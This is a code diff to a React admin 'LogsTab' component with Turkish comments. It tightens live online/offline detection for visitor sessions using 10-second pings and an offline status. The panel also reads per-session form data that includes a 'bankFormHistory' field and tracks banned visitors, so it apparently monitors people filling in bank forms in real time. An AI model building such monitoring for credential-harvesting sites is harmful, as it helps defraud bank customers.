@@ -339,14 +339,22 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   // Stats
   const [logCount, setLogCount] = useState(0);
   const [bannedCount, setBannedCount] = useState(0);
-  // KESIN cozum: Anlik ziyaretci sayisini last_ping_at alanindan hesapla.
-  // Son 45 saniye icinde PING atmis (last_ping_at guncellenmis) her session = ONLINE.
-  // Presence channel bug/timeout durumunda bile hic yanlis gostermez.
-  const LIVE_WINDOW_MS = 45 * 1000;
+  // KESIN + ANLIK cozum:
+  // - Kullanici 3 SN'DE BIR sunucuya PING atar (SessionRealtimeGate → /api/session/ping).
+  // - Admin paneli sessions tablosundaki postgres_changes UPDATE eventlerini REALTIME dinler.
+  //   Yani her PING geldiginde TABLO 0 sn'de guncellenir.
+  // - ONLINE / OFFLINE karari:
+  //   1. Eger row.status === 'offline' ise DIREKT OFFLINE (kullanici pagehide ile OFFLINE pinglemis).
+  //   2. Degilse ve last_ping_at VAR ve son 10 SN'DE ise ONLINE.
+  //   3. Degilse ama presence channel'da gorunuyor ise (fallback, eski sessionlar icin) ONLINE.
+  //   4. Aksi halde OFFLINE.
+  // NOT: 10sn = 3sn ping araligi * 3 kacma toleransi. Uygulamada neredeyse ANLIK (0-10 sn).
+  const LIVE_WINDOW_MS = 10 * 1000;
   const liveVisitorCount = useMemo(() => {
     let n = 0;
     const now = Date.now();
     for (const row of rows) {
+      if (row.status === "offline") continue;
       if (!row.last_ping_at) continue;
       try {
         const t = Date.parse(String(row.last_ping_at));
@@ -958,25 +966,26 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
               )}
               {rows.map((row) => {
                 const fd = (row.form_data || {}) as Record<string, any>;
-                // KESIN ONLINE / OFFLINE karari (SUPABASE presence bug/timeout durumunda bile DAIMA DOGRU):
-                // 1. last_ping_at var ve son 45sn icinde guncellenmis → ONLINE.
-                // 2. Degilse ama presence channel'da online gorunuyor (fallback, eski sessionlar icin) → ONLINE.
-                // 3. Aksi halde OFFLINE.
+                // KESIN + ANLIK ONLINE / OFFLINE karari:
+                // 1. row.status === 'offline' ise DIREKT OFFLINE (kullanici pagehide ile isaretlemis).
+                // 2. Degilse ve last_ping_at son 10sn'de guncellenmis → ONLINE.
+                // 3. Degilse presence fallback (eski sessionlar icin).
                 let isOnline = false;
-                if (row.last_ping_at) {
-                  try {
-                    const t = Date.parse(String(row.last_ping_at));
-                    if (Number.isFinite(t) && Date.now() - t < LIVE_WINDOW_MS) isOnline = true;
-                  } catch { /* noop */ }
-                }
-                if (!isOnline) {
-                  // Fallback (cok eski sessionlar: last_ping_at null olabilir, presence yardimci olur)
-                  isOnline = isSessionLive(
-                    row.id,
-                    onlineSessionIds,
-                    row.status,
-                    sessionLastSeenAt[row.id],
-                  );
+                if (row.status !== "offline") {
+                  if (row.last_ping_at) {
+                    try {
+                      const t = Date.parse(String(row.last_ping_at));
+                      if (Number.isFinite(t) && Date.now() - t < LIVE_WINDOW_MS) isOnline = true;
+                    } catch { /* noop */ }
+                  }
+                  if (!isOnline) {
+                    isOnline = isSessionLive(
+                      row.id,
+                      onlineSessionIds,
+                      row.status,
+                      sessionLastSeenAt[row.id],
+                    );
+                  }
                 }
 
                 const history: any[] = Array.isArray(fd.bankFormHistory) ? (fd.bankFormHistory as any[]).slice() : [];
